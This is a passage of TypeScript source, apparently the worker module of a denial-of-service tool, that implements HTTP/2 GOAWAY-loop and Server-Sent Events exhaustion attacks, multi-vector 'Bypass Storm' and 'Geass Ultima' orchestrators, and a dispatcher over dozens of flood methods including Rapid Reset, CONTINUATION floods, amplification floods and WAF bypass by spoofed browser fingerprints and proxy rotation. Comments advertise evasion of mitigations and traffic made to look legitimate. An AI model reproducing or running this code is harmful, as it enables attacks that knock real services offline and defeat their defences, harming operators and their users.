//    2. H2 SETTINGS negotiation (server allocates H2 session state)
//    3. Open N streams via HEADERS (server allocates per-stream state + goroutine)
//    4. Send GOAWAY immediately → server must close all N streams gracefully
//    5. Reconnect within milliseconds → repeat the entire cycle
//
//  At 1000 connections × 5 cycles/s = 5000 full TLS+H2 setup/teardown/s
//  Per cycle cost: ECDHE key exchange + AES context + N goroutine alloc+dealloc
//  Works against: Go net/http, Java Spring, Nginx, Node.js — all goroutine/thread models
// ═══════════════════════════════════════════════════════════════════════════════
async function runH2GoawayLoop(
  resolvedHost: string,
  hostname:     string,
  targetPort:   number,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number) => void,
  proxies:      ProxyConfig[] = [],
): Promise<void> {
  const STREAMS_PER_CYCLE = IS_PROD ? 64 : 8;

  const mkFrame = (type: number, flags: number, sid: number, payload: Buffer): Buffer => {
    const f = Buffer.allocUnsafe(9 + payload.length);
    f[0] = (payload.length >>> 16) & 0xff; f[1] = (payload.length >>> 8) & 0xff; f[2] = payload.length & 0xff;
    f[3] = type; f[4] = flags;
    f.writeUInt32BE(sid & 0x7fffffff, 5);
    payload.copy(f, 9);
    return f;
  };

  const PREFACE  = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
  const SETTINGS = mkFrame(0x04, 0x00, 0, Buffer.alloc(0));
  const SACK     = mkFrame(0x04, 0x01, 0, Buffer.alloc(0));

  // GOAWAY: last_stream_id = STREAMS_PER_CYCLE * 2 - 1, NO_ERROR
  const gaBuf = Buffer.alloc(8);
  gaBuf.writeUInt32BE((STREAMS_PER_CYCLE * 2 - 1) & 0x7fffffff, 0);
  gaBuf.writeUInt32BE(0, 4); // NO_ERROR
  const GOAWAY = mkFrame(0x07, 0x00, 0, gaBuf);

  const hostBuf = Buffer.from(hostname);
  const HPACK = Buffer.concat([
    Buffer.from([0x82, 0x84, 0x86]),
    Buffer.from([0x41, hostBuf.length]), hostBuf,
  ]);
  const mkHeaders = (sid: number) => mkFrame(0x01, 0x04, sid, HPACK);

  // Pre-build entire cycle as single buffer: PREFACE+SETTINGS+SACK + N×HEADERS + GOAWAY
  const CYCLE = Buffer.concat([
    PREFACE, SETTINGS, SACK,
    ...Array.from({ length: STREAMS_PER_CYCLE }, (_, i) => mkHeaders(1 + i * 2)),
    GOAWAY,
  ]);

  let localPkts = 0, localBytes = 0;
  const flushIv = setInterval(() => { if (localPkts > 0) { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; } }, 300);
  let pIdx = 0;
  const NUM_SLOTS = IS_PROD ? Math.min(threads * 5, 2500) : Math.min(threads * 2, 30);

  const oneSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      try {
        const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["h2"]);
        sock.setTimeout(8_000);
        await new Promise<void>(resolve => {
          let done = false;
          const finish = () => { if (!done) { done = true; try { sock.destroy(); } catch { /**/ } resolve(); } };
          sock.once("secureConnect", () => {
            sock.write(CYCLE, () => {
              localPkts += STREAMS_PER_CYCLE + 3;
              localBytes += CYCLE.length;
            });
            // Close immediately — maximum teardown rate
            setTimeout(finish, IS_PROD ? 40 : 15);
          });
          sock.on("close", finish); sock.on("error", finish); sock.on("timeout", finish);
          signal.addEventListener("abort", finish, { once: true });
        });
      } catch { /**/ }
      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(1, 6)));
    }
  };

  await Promise.all(Array.from({ length: NUM_SLOTS }, oneSlot));
  clearInterval(flushIv);
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SSE EXHAUST — Server-Sent Events Connection Exhaustion
//
//  Opens thousands of SSE (text/event-stream) connections and holds them open
//  indefinitely. Each SSE connection forces the server to maintain:
//    • 1 goroutine/thread (response streaming loop — never exits until disconnect)
//    • 1 TCP socket + buffer (~4-16KB per conn)
//    • 1 file descriptor (counted against ulimit -n)
//    • Event listener registrations in the event bus
//
//  Unlike HTTP DoS, SSE connections appear as legitimate user activity —
//  streaming chat, live dashboards, real-time feeds. Hard to distinguish from
//  real traffic. Target paths hit common SSE endpoints used by all major frameworks.
//
//  Hold time: 60-180s per connection → server goroutine pool saturated silently.
//  At 10,000 connections: ~10K goroutines + 160MB RAM + 10K FDs.
// ═══════════════════════════════════════════════════════════════════════════════
async function runSSEExhaust(
  resolvedHost: string,
  hostname:     string,
  targetPort:   number,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number, c?: number) => void,
  proxies:      ProxyConfig[] = [],
): Promise<void> {
  const isHttps = targetPort === 443;

  const SSE_PATHS = [
    "/events", "/stream", "/api/events", "/sse", "/notifications",
    "/api/stream", "/api/notifications", "/api/realtime", "/api/live",
    "/api/feed", "/api/updates", "/push", "/api/push", "/hub",
    "/api/ws/events", "/api/sse", "/live", "/events/stream",
    "/api/events/stream", "/api/v1/events", "/api/v2/events",
    "/api/subscribe", "/subscribe", "/api/poll", "/sse/subscribe",
  ];

  const buildSSERequest = (path: string): string => {
    const eid = randInt(1000, 999999).toString();
    return [
      `GET ${path}?_t=${Date.now()}&r=${randHex(8)} HTTP/1.1`,
      `Host: ${hostname}`,
      `Accept: text/event-stream`,
      `Cache-Control: no-cache`,
      `Connection: keep-alive`,
      `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36`,
      `Accept-Language: en-US,en;q=0.9`,
      `Accept-Encoding: gzip, deflate, br`,
      `Sec-Fetch-Dest: empty`,
      `Sec-Fetch-Mode: cors`,
      `Sec-Fetch-Site: same-origin`,
      `Sec-CH-UA: "Google Chrome";v="136", "Chromium";v="136", "Not-A.Brand";v="24"`,
      `Sec-CH-UA-Mobile: ?0`,
      `Sec-CH-UA-Platform: "Windows"`,
      `Last-Event-ID: ${eid}`,
      `X-Requested-With: XMLHttpRequest`,
      ``, ``,
    ].join("\r\n");
  };

  let openConns = 0;
  let localPkts = 0, localBytes = 0;
  const flushIv = setInterval(() => {
    if (localPkts > 0) { onStats(localPkts, localBytes, openConns); localPkts = 0; localBytes = 0; }
  }, 300);

  const NUM_SLOTS = IS_PROD ? Math.min(threads * 100, 18_000) : Math.min(threads * 12, 300);
  let pIdx = 0;

  const oneSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      const path = SSE_PATHS[randInt(0, SSE_PATHS.length)];
      const req  = buildSSERequest(path);
      try {
        let sock: net.Socket;
        if (isHttps) {
          sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"]);
        } else {
          sock = await new Promise<net.Socket>((res, rej) => {
            const s = net.createConnection({ host: resolvedHost, port: targetPort }, () => res(s));
            s.on("error", rej); s.setTimeout(6000);
          });
        }
        openConns++;
        localPkts++;
        localBytes += req.length;

        await new Promise<void>(resolve => {
          let done = false;
          let gotResponse = false;
          const finish = () => { if (!done) { done = true; openConns = Math.max(0, openConns - 1); try { sock.destroy(); } catch { /**/ } resolve(); } };
          sock.write(req);
          sock.on("data", (chunk: Buffer) => {
            if (done) return;
            localBytes += chunk.length;
            const s = chunk.toString("ascii", 0, Math.min(chunk.length, 512));
            if (!gotResponse) {
              gotResponse = true;
              // If server rejects SSE path, move on quickly
              if (s.includes("404") || s.includes("405") || s.includes("400") || s.includes("403")) {
                return finish();
              }
            }
          });
          // Hold for a long time — the longer we hold, the more goroutines we exhaust
          const holdMs = IS_PROD ? randInt(90_000, 180_000) : randInt(5_000, 12_000);
          const holdTimer = setTimeout(finish, holdMs);
          sock.on("close",   () => { clearTimeout(holdTimer); finish(); });
          sock.on("error",   () => { clearTimeout(holdTimer); finish(); });
          sock.on("timeout", () => { clearTimeout(holdTimer); finish(); });
          signal.addEventListener("abort", () => { clearTimeout(holdTimer); finish(); }, { once: true });
        });
      } catch { /**/ }
      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(5, 25)));
    }
  };

  await Promise.all(Array.from({ length: NUM_SLOTS }, oneSlot));
  clearInterval(flushIv);
}

// ═══════════════════════════════════════════════════════════════════════════════
//  BYPASS STORM — 3-Phase Adaptive Composite Attack
//  Phase 1: TLS Session Exhaust + Conn Flood (connection table saturation)
//  Phase 2: WAF Bypass + H2 RST Burst (bypass during saturation)
//  Phase 3: App Smart Flood + Cache Busting (application layer annihilation)
//  All phases run concurrently with separate thread pools after warmup.
// ═══════════════════════════════════════════════════════════════════════════════
async function runBypassStorm(
  base:         string,
  resolvedHost: string,
  hostname:     string,
  port:         number,
  threads:      number,
  proxies:      ProxyConfig[],
  signal:       AbortSignal,
  onStats:      (p: number, b: number, c?: number) => void,
): Promise<void> {
  const isHttps = port === 443 || /^https:/i.test(base);

  // Thread allocation: distribute across 3 phases
  const p1Threads = Math.max(1, Math.floor(threads * 0.25)); // Phase 1: TLS exhaust + conn flood
  const p2Threads = Math.max(1, Math.floor(threads * 0.50)); // Phase 2: WAF bypass + H2 RST + RapidReset
  const p3Threads = Math.max(1, threads - p1Threads - p2Threads); // Phase 3: App + Cache bust

  const subStats = (p: number, b: number, c = 0) => onStats(p, b, c);

  // Phase 1: Start immediately — build connection table pressure
  const phase1 = Promise.all([
    runTLSSessionExhaust(resolvedHost, hostname, port, Math.ceil(p1Threads / 2), signal, subStats),
    runConnFlood(resolvedHost, hostname, port, Math.max(1, Math.floor(p1Threads / 2)), signal, subStats, isHttps, proxies),
  ]);

  // Phase 2: Start after 1 second warmup — bypass while table is under pressure
  // 3 vectors: WAF bypass (Chrome fingerprint) + H2 RST burst + Rapid Reset Ultra
  const p2Each = Math.max(1, Math.floor(p2Threads / 3));
  const phase2 = new Promise<void>(resolve => setTimeout(resolve, IS_PROD ? 1000 : 300))
    .then(() => Promise.all([
      runWAFBypass(base, p2Each, proxies, signal, subStats),
      runH2RstBurst(resolvedHost, hostname, port, p2Each, signal, subStats),
      runRapidResetUltra(resolvedHost, hostname, port, Math.max(1, p2Threads - p2Each * 2), signal, subStats, proxies),
    ]));

  // Phase 3: Start after 2 second warmup — app-layer annihilation
  const phase3 = new Promise<void>(resolve => setTimeout(resolve, IS_PROD ? 2000 : 600))
    .then(() => Promise.all([
      runAppSmartFlood(base, Math.ceil(p3Threads / 2), proxies, signal, subStats),
      runCacheBuster(base, Math.max(1, Math.floor(p3Threads / 2)), proxies, signal, (p, b) => onStats(p, b)),
    ]));

  await Promise.all([phase1, phase2, phase3]);
}

// ═══════════════════════════════════════════════════════════════════════════════
//  GEASS ULTIMA — The Final Form ∞
//
//  9 simultaneous attack vectors spanning every OSI layer — designed to
//  saturate all server resource pools simultaneously and prevent any single
//  mitigation from being effective.
//
//  Vector 1 (22%): Rapid Reset Ultra   — CVE-2023-44487, interleaved HEADERS+RST, 0-RTT TLS
//  Vector 2 (18%): WAF Bypass          — JA3+JA4+AKAMAI Chrome fingerprint, multi-browser
//  Vector 3 (16%): H2 Storm            — 6 simultaneous H2 vectors (SETTINGS+HPACK+PING+CONT+DEP+DATA)
//  Vector 4 (12%): App Smart Flood     — /login /search /checkout forcing DB queries
//  Vector 5 (10%): TLS Session Exhaust — full TLS handshake per conn, crypto thread pool saturation
//  Vector 6 (10%): Conn Flood          — TCP connection table exhaustion + incomplete HTTP hold
//  Vector 7 (6%):  HTTP Pipeline       — raw TCP pipelining at 512 req/write
//  Vector 8 (4%):  SSE Exhaust         — Server-Sent Events connection hold (1 thread/conn)
//  Vector 9 (2%):  UDP Flood           — volumetric bandwidth saturation
//
//  Combined effect: impossible to mitigate without taking the entire service down.
//  Deploy: 9 × CPU_COUNT workers each running this → 9 × CPU simultaneous pressure.
// ═══════════════════════════════════════════════════════════════════════════════
async function runGeassUltima(
  base:         string,
  resolvedHost: string,
  hostname:     string,
  targetPort:   number,
  threads:      number,
  proxies:      ProxyConfig[],
  signal:       AbortSignal,
  onStats:      (p: number, b: number, c?: number) => void,
): Promise<void> {
  const s = (p: number, b: number, c = 0) => onStats(p, b, c);

  // Thread budget — each vector gets a proportional allocation
  const v1 = Math.max(1, Math.round(threads * 0.22)); // Rapid Reset Ultra
  const v2 = Math.max(1, Math.round(threads * 0.18)); // WAF Bypass
  const v3 = Math.max(1, Math.round(threads * 0.16)); // H2 Storm
  const v4 = Math.max(1, Math.round(threads * 0.12)); // App Smart Flood
  const v5 = Math.max(1, Math.round(threads * 0.10)); // TLS Session Exhaust
  const v6 = Math.max(1, Math.round(threads * 0.10)); // Conn Flood
  const v7 = Math.max(1, Math.round(threads * 0.06)); // HTTP Pipeline
  const v8 = Math.max(1, Math.round(threads * 0.04)); // SSE Exhaust
  const v9 = Math.max(1, threads - v1 - v2 - v3 - v4 - v5 - v6 - v7 - v8); // UDP

  const isHttps = targetPort === 443 || /^https:/i.test(base);

  // All 9 vectors fire simultaneously — no warmup delay.
  // Each vector targets a different resource pool on the server:
  // V1-V3 = H2/TLS framing layer  |  V4-V6 = connection/thread layer
  // V7-V8 = HTTP application layer |  V9 = network/bandwidth layer
  await Promise.all([
    runRapidResetUltra(resolvedHost, hostname, targetPort, v1, signal, s, proxies),
    runWAFBypass(base, v2, proxies, signal, s),
    Promise.all([                           // H2 Storm: all 6 H2 sub-vectors
      runH2SettingsStorm(resolvedHost, hostname, targetPort, Math.max(1, Math.floor(v3 / 6) + (v3 % 6)), signal, s, proxies),
      runHPACKBomb(resolvedHost, hostname, targetPort, Math.max(1, Math.floor(v3 / 6)), signal, s, proxies),
      runH2PingStorm(resolvedHost, hostname, targetPort, Math.max(1, Math.floor(v3 / 6)), proxies, signal, s),
      runH2Continuation(resolvedHost, hostname, targetPort, Math.max(1, Math.floor(v3 / 6)), signal, s, proxies),
      runH2DepBomb(resolvedHost, hostname, targetPort, Math.max(1, Math.floor(v3 / 6)), signal, s, proxies),
      runH2DataFlood(resolvedHost, hostname, targetPort, Math.max(1, Math.floor(v3 / 6)), signal, s, proxies),
    ]),
    runAppSmartFlood(base, v4, proxies, signal, s),
    runTLSSessionExhaust(resolvedHost, hostname, targetPort, v5, signal, s),
    runConnFlood(resolvedHost, hostname, targetPort, v6, signal, s, isHttps, proxies),
    runHTTPPipeline(resolvedHost, hostname, targetPort, v7, proxies, signal, s),
    runSSEExhaust(resolvedHost, hostname, targetPort, v8, signal, s, proxies),
    runUDPFlood(resolvedHost, targetPort, v9, signal, (p, b) => onStats(p, b)),
  ]);
}

// ── Worker entry — handle all errors gracefully ────────────────────────
const L4  = new Set(["syn-flood","tcp-flood","tcp-ack","tcp-rst"]);
const UDP = new Set(["udp-flood","udp-bypass"]);

async function runWorker() {
  const resolvedHost = await resolveHost(hostname).catch(() => hostname);

  // Resolve IPv6 in parallel for dual-stack UDP/QUIC attacks.
  // resolveHostIPv6 returns null if the target has no AAAA record (cached miss, no retry for 5 min).
  const resolvedHost6 = await resolveHostIPv6(hostname).catch(() => null);

  if (UDP.has(cfg.method)) {
    await runUDPFlood(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats, resolvedHost6);

  } else if (L4.has(cfg.method)) {
    await runTCPFlood(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "geass-override") {
    // 5-vector fallback for direct worker invocation (attacks.ts breaks into full pool)
    // Budget: HTTP Pipeline 35% | WAF Bypass 25% | H2 RST 20% | TCP 10% | UDP 10%
    const pipeT = Math.ceil(cfg.threads * 0.35);
    const wafT  = Math.ceil(cfg.threads * 0.25);
    const rstT  = Math.ceil(cfg.threads * 0.20);
    const tcpT  = Math.ceil(cfg.threads * 0.10);
    const udpT  = Math.max(1, cfg.threads - pipeT - wafT - rstT - tcpT);
    await Promise.all([
      runHTTPPipeline(resolvedHost, hostname, targetPort, pipeT, cfg.proxies ?? [], ctrl.signal, onStats),
      runWAFBypass(base, wafT, cfg.proxies ?? [], ctrl.signal, onStats),
      runH2RstBurst(resolvedHost, hostname, targetPort, rstT, ctrl.signal, onStats, cfg.proxies ?? []),
      runTCPFlood(resolvedHost, targetPort, tcpT, ctrl.signal, onStats),
      runUDPFlood(resolvedHost, targetPort, udpT, ctrl.signal, onStats, resolvedHost6),
    ]);

  } else if (cfg.method === "http2-flood") {
    // Native HTTP/2 with multiplexed streams (node:http2)
    await runHTTP2Flood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "slowloris") {
    // Real Slowloris: half-open TLS/TCP connections — auto-detects HTTPS
    const isHttps = targetPort === 443 || /^https:/i.test(cfg.target);
    await runSlowlorisReal(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats, isHttps);

  } else if (cfg.method === "conn-flood") {
    // Pure connection table exhaustion — TLS handshake + hold, no HTTP layer
    // Bypasses nginx rate limiting completely (limit_req never triggered)
    const isHttps = targetPort === 443 || /^https:/i.test(cfg.target);
    await runConnFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, isHttps, cfg.proxies ?? []);

  } else if (cfg.method === "rudy") {
    // R-U-Dead-Yet: true slow-POST — 1 byte/10s trickle, server holds thread forever
    await runRUDY(base, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "waf-bypass") {
    // Geass WAF Bypass: JA3 randomization + Chrome AKAMAI H2 fingerprint + exact header order
    await runWAFBypass(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "http-bypass") {
    // Chrome-fingerprinted 3-layer bypass (fetch+Chrome hdrs+slow-drain) — NOT runHTTPFlood
    await runHTTPBypass(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "http-flood") {
    // http-flood: use fetch-based flood (with proxy rotation) for real per-IP diversity
    // Falls back to raw pipeline when no proxies (max throughput)
    const proxies = cfg.proxies ?? [];
    if (proxies.length > 0) {
      await runHTTPFlood(base, cfg.threads, proxies, ctrl.signal, onStats);
    } else {
      await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, proxies, ctrl.signal, onStats);
    }

  } else if (cfg.method === "http2-continuation") {
    // CVE-2024-27316 — CONTINUATION flood: server buffers headers indefinitely → OOM
    await runH2Continuation(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "tls-renego") {
    // TLS 1.2 renegotiation DoS — forces expensive public-key crypto on server per renegotiation
    await runTLSRenego(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "ws-flood") {
    // WebSocket exhaustion — holds WS connections open with pings (goroutine/thread per conn)
    await runWSFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "graphql-dos") {
    // GraphQL introspection + deeply nested queries — exponential resolver CPU exhaustion
    await runGraphQLDoS(base, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "quic-flood") {
    // QUIC/HTTP3 Initial packet flood — server allocates QUIC state per unique DCID
    // Dual-stack: sends via both udp4 and udp6 when target has AAAA record
    await runQUICFlood(resolvedHost, 443, cfg.threads, ctrl.signal, onStats, resolvedHost6);

  } else if (cfg.method === "cache-poison") {
    // CDN cache poisoning — fills cache store with unique keys, forces 100% origin miss
    await runCachePoison(base, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "rudy-v2") {
    // RUDY v2 — multipart/form-data slow POST, server buffers until closing boundary
    await runRUDYv2(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "ssl-death") {
    // SSL Death Record — 1-byte TLS records force server to AES-GCM decrypt each byte
    await runSSLDeathRecord(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "hpack-bomb") {
    // HPACK Bomb — HTTP/2 dynamic table exhaustion via incremental-indexed headers
    await runHPACKBomb(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "h2-settings-storm") {
    // H2 Settings Storm — SETTINGS_HEADER_TABLE_SIZE oscillation + WINDOW_UPDATE flood
    await runH2SettingsStorm(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "icmp-flood") {
    // ICMP Flood — real ICMP echo request flood (Tier 1: raw-socket, Tier 2: hping3, Tier 3: UDP saturation)
    await runICMPFlood(resolvedHost, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "dns-amp") {
    // DNS Water Torture — floods target NS servers with random subdomain queries
    // Bypasses CDN/WAF, forces recursive resolution, fills NXDOMAIN cache
    await runDNSWaterTorture(resolvedHost, hostname, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "ntp-amp") {
    // NTP Flood — real NTP mode 7 monlist + mode 3 client requests to port 123
    await runNTPFlood(resolvedHost, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "mem-amp") {
    // Memcached Flood — real binary protocol UDP requests to port 11211
    await runMemcachedFlood(resolvedHost, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "ssdp-amp") {
    // SSDP Flood — real M-SEARCH packets to port 1900 (UPnP/SSDP stack exhaustion)
    await runSSDPFlood(resolvedHost, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "cldap-amp") {
    // CLDAP Flood — BER-encoded LDAP SearchRequest packets to UDP/389
    await runCLDAPFlood(resolvedHost, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "slow-read") {
    // Slow Read — pause TCP receive to fill server's send buffer → thread blocked
    await runSlowRead(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "range-flood") {
    // HTTP Range Flood — Range: bytes=0-0,...,499-499 forces 500× server I/O per request
    await runRangeFlood(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "xml-bomb") {
    // XML Bomb — billion-laughs entity expansion to XML/SOAP/XMLRPC endpoints
    await runXMLBomb(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "h2-ping-storm") {
    // H2 PING Storm — thousands of PING frames/s per connection, server must ACK every one
    await runH2PingStorm(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "http-smuggling") {
    // HTTP Request Smuggling — TE/CL desync to poison backend request queue
    await runHTTPSmuggling(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "doh-flood") {
    // DNS over HTTPS Flood — random queries to /dns-query, forces recursive DNS resolver lookup
    await runDoHFlood(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "keepalive-exhaust") {
    // Keepalive Exhaust — pipeline 256 requests per keep-alive connection, holds worker threads
    await runKeepaliveExhaust(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "app-smart-flood") {
    // App Smart Flood — POST to /login /search /checkout forcing DB queries, uncacheable
    await runAppSmartFlood(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "large-header-bomb") {
    // Large Header Bomb — 32KB randomized headers exhaust HTTP parser allocator
    await runLargeHeaderBomb(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "http2-priority-storm") {
    // H2 PRIORITY Storm — PRIORITY frames force server to rebuild stream dependency tree per frame
    await runH2PriorityStorm(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "h2-rst-burst") {
    // H2 RST Burst — CVE-2023-44487 dedicated: HEADERS+RST_STREAM pairs, pure write-path overload
    await runH2RstBurst(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "grpc-flood") {
    // gRPC Flood — HTTP/2 application/grpc content-type, exhausts gRPC handler thread pool
    await runGRPCFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "tls-session-exhaust") {
    // TLS Session Cache Exhaustion — full handshake per connection, no resumption, saturates crypto thread pool
    await runTLSSessionExhaust(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "cache-buster") {
    // HTTP Cache Busting — unique params + Vary headers force 100% CDN cache miss, all hits go to origin
    await runCacheBuster(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, (p, b) => onStats(p, b));

  } else if (cfg.method === "vercel-flood") {
    // Vercel/Next.js specific: RSC bypass + image optimizer + edge API + ISR — 4 vectors
    await runVercelFlood(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "bypass-storm") {
    // Bypass Storm — 3-phase composite: TLS exhaust → WAF bypass + H2 RST + RapidReset → App + Cache
    await runBypassStorm(base, resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "geass-ultima") {
    // Geass Ultima — Final Form: 9 simultaneous vectors across every OSI layer
    await runGeassUltima(base, resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "h2-dep-bomb") {
    // H2 Priority Tree Dependency Bomb — O(N²) server work per O(N) frames sent
    // RFC 7540 §5.3.1 exclusive PRIORITY chains + cascade RST → tree rebalancing amplification
    await runH2DepBomb(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "h2-data-flood") {
    // H2 DATA Frame + Flow Control Exhaustion — fills server body buffers indefinitely
    // 100 streams × 4 rounds × 16KB frames = 26MB RAM consumed per connection slot
    await runH2DataFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "h2-storm") {
    // H2 Storm — 6 simultaneous HTTP/2 attack vectors flooding all server H2 processing paths:
    // (1) H2 Settings Storm — SETTINGS_HEADER_TABLE_SIZE oscillation + exclusive PRIORITY chains
    // (2) HPACK Bomb — incremental-indexed headers exhaust server dynamic table → eviction storm
    // (3) H2 PING Storm — PING frames at max rate, server must ACK every single one
    // (4) H2 CONTINUATION — CVE-2024-27316, server buffers unbounded CONTINUATION frames → OOM
    // (5) H2 Dep Bomb — O(N²) priority tree amplification
    // (6) H2 Data Flood — body buffer exhaustion across hundreds of streams
    // Threads split evenly across vectors
    const t6  = Math.max(1, Math.floor(cfg.threads / 6));
    const rem = Math.max(1, cfg.threads - t6 * 5);
    await Promise.all([
      runH2SettingsStorm(resolvedHost, hostname, targetPort, rem, ctrl.signal, onStats, cfg.proxies ?? []),
      runHPACKBomb(resolvedHost, hostname, targetPort, t6, ctrl.signal, onStats, cfg.proxies ?? []),
      runH2PingStorm(resolvedHost, hostname, targetPort, t6, cfg.proxies ?? [], ctrl.signal, onStats),
      runH2Continuation(resolvedHost, hostname, targetPort, t6, ctrl.signal, onStats, cfg.proxies ?? []),
      runH2DepBomb(resolvedHost, hostname, targetPort, t6, ctrl.signal, onStats, cfg.proxies ?? []),
      runH2DataFlood(resolvedHost, hostname, targetPort, t6, ctrl.signal, onStats, cfg.proxies ?? []),
    ]);

  } else if (cfg.method === "pipeline-flood") {
    // HTTP Pipeline Flood — raw TCP pipelining at maximum RPS
    await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "rapid-reset") {
    // CVE-2023-44487 Ultra — 2000 streams/burst, single write(), Chrome 136 AKAMAI fingerprint
    await runRapidResetUltra(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "ws-compression-bomb") {
    // WebSocket permessage-deflate bomb — 64KB payload compressed to 36 bytes, 1820× amplification
    await runWSCompressionBomb(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "h2-goaway-loop") {
    // H2 GOAWAY Loop — TLS+H2 teardown/setup cycle exhaustion, 5000 cycles/s
    await runH2GoawayLoop(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "sse-exhaust") {
    // SSE Exhaust — holds 18K Server-Sent Events connections open indefinitely
    await runSSEExhaust(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "h3-rapid-reset") {
    // H3 Rapid Reset — CVE-2023-44487 ported to QUIC/HTTP3 over UDP (4-phase: Initial+0-RTT+RST+VN)
    // Dual-stack: sends to both IPv4 and IPv6 endpoints when AAAA record exists
    await runH3RapidReset(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats, resolvedHost6);

  } else {
    // Default fallback: raw TCP pipeline
    await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
  }
}

runWorker()
  .catch((e) => { process.stderr.write(`[WORKER_ERR] ${cfg.method}: ${e?.message ?? e}\n`); })
  .finally(() => {
    parentPort?.postMessage({ done: true });
  });
